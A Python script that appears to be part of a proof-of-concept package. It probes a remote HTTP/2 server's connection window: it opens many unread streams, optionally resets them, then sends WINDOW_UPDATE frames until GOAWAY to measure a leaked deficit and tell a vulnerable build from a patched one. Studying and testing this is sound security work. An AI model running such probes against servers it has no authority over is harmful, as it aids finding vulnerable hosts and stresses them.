#!/usr/bin/env python3
"""Remote HTTP/2 connection-window probe - quantitative, client-side only.

Both a vulnerable and a patched build drift, so "accepted / rejected" proves
nothing.  What differs is the EFFECT OF CLEANUP on the drifted window:

  * 1.31.8 - ngx_http_v2_filter_cleanup() returns the window charged by
    non-blocked frames, so cleanup leaves a SMALLER deficit than the same load
    without cleanup.
  * 1.31.9 - cleanup charges the window further, so the deficit GROWS.

The deficit is measured, not guessed: after the load, WINDOW_UPDATE frames of
a fixed step are fed in until the server answers GOAWAY (the increment no
longer fits).  accepted_steps * step is the missing window.

Usage: remote_leak.py <host> <port> <path> <streams> <do_reset 0|1> [step]
Prints one line:  deficit <bytes> steps <n> goaway <0|1>
"""
import os
import socket
import ssl
import sys
import time

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                "..", "poc", "_vendor"))

import h2.config  # noqa: E402
import h2.connection  # noqa: E402

HOST = sys.argv[1]
PORT = int(sys.argv[2])
PATH = sys.argv[3]
N = int(sys.argv[4])
DO_RST = int(sys.argv[5])
STEP = int(sys.argv[6]) if len(sys.argv) > 6 else 2 * 1024 * 1024
DRAIN = float(sys.argv[7]) if len(sys.argv) > 7 else 0.0
MAX_STEPS = 200
MAX = 2 ** 31 - 1

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
ctx.set_alpn_protocols(["h2"])


def wu(inc, sid=0):
    return bytes([0, 0, 4, 0x8, 0]) + sid.to_bytes(4, "big") \
        + inc.to_bytes(4, "big")


s = ctx.wrap_socket(socket.create_connection((HOST, PORT), timeout=10),
                    server_hostname=HOST)
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1024)

c = h2.connection.H2Connection(
    config=h2.config.H2Configuration(client_side=True))
c.initiate_connection()
c.update_settings({h2.settings.SettingCodes.INITIAL_WINDOW_SIZE: MAX,
                   h2.settings.SettingCodes.MAX_CONCURRENT_STREAMS: 5000})
s.sendall(c.data_to_send())

H = [(b":method", b"GET"), (b":path", PATH.encode()),
     (b":scheme", b"https"), (b":authority", HOST.encode())]

# 1) window to its legal maximum
s.sendall(wu(MAX - 65535))
time.sleep(0.3)

# 2) load.  Nothing is read, so charged DATA frames stay blocked in the
#    output queue and the window stays charged.
try:
    for i in range(N):
        c.send_headers(3 + 2 * i, H, end_stream=True)
    s.sendall(c.data_to_send())
except Exception:
    pass
if DRAIN:
    s.settimeout(0.2)
    _end = time.time() + DRAIN
    while time.time() < _end:
        try:
            if not s.recv(65536):
                break
        except Exception:
            pass
else:
    time.sleep(2.0)

# 3) cleanup
if DO_RST:
    for i in range(N - 1):
        try:
            s.sendall(bytes([0, 0, 4, 0x3, 0])
                      + (3 + 2 * i).to_bytes(4, "big") + b"\x00\x00\x00\x00")
        except Exception:
            pass
    time.sleep(1.0)


def saw_goaway():
    """True when the server sent GOAWAY or hung up."""
    try:
        d = s.recv(65536)
    except socket.timeout:
        return False
    except Exception:
        return True
    if not d:
        return True
    off = 0
    while off + 9 <= len(d):
        length = int.from_bytes(d[off:off + 3], "big")
        if d[off + 3] == 0x7:
            return True
        off += 9 + length
    return False


# 4) step until the increment no longer fits
steps = 0
goaway = 0
s.settimeout(0.5)
for _ in range(MAX_STEPS):
    try:
        s.sendall(wu(STEP))
    except Exception:
        goaway = 1
        break
    if saw_goaway():
        goaway = 1
        break
    steps += 1

print("deficit %d steps %d goaway %d" % (steps * STEP, steps, goaway))
